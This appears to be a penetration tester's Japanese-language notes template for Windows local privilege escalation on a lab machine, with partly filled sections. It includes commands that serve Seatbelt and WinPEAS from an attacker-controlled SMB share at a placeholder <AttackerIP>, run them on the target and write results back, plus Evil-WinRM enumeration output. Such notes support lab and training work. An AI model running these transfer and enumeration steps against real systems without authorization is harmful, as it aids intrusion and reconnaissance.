# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\<AttackerIP>\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
```

### 実行結果抽出

```powershell

```

---
---

## Manual

### ユーザー

- 特に興味深い権限は持っていない
```sh
*Evil-WinRM* PS C:\Users\Sandra\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system  Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
*Evil-WinRM* PS C:\Users\Sandra\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\Sandra\Desktop> 

```




---

### システム情報


---

### ネットワーク

- ftpであったdb.devのポートは動作していなさそう


---

### インストール済みアプリケーション


---

### 実行中のプロセス


---

### PowerShellログ


---

### サービス


---

### スケジュールタスク


---

### 興味深い情報

#### C:\Users -> nothing

- adminのホームは覗けない
```sh
Evil-WinRM* PS C:\Users> tree /f
Folder PATH listing
Volume serial number is 7A11-DA09
C:.
ÃÄÄÄAdministrator
ÃÄÄÄDefaultAppPool
ÃÄÄÄPublic
ÀÄÄÄSandra
    ÃÄÄÄ3D Objects
    ÃÄÄÄContacts
    ÃÄÄÄDesktop
    ³       local.txt
    ³
    ÃÄÄÄDocuments
    ³       .env
    ³       Acq.dll
    ³       DVRParams.ini
    ³       Manifest.dll
    ³       program.exe
    ³       verisign.png
    ³       wab.dll
    ³
    ÃÄÄÄDownloads
    ÃÄÄÄFavorites
    ³   ³   Bing.url
    ³   ³
    ³   ÀÄÄÄLinks
    ÃÄÄÄLinks
    ³       Desktop.lnk
    ³       Downloads.lnk
    ³
    ÃÄÄÄMusic
    ÃÄÄÄPictures
    ³   ÃÄÄÄCamera Roll
    ³   ÀÄÄÄSaved Pictures
    ÃÄÄÄSaved Games
    ÃÄÄÄSearches
    ³       winrt--{S-1-5-21-4214290425-2411352775-3126579912-1002}-.searchconnector-ms
    ³
    ÀÄÄÄVideos

```


---
---
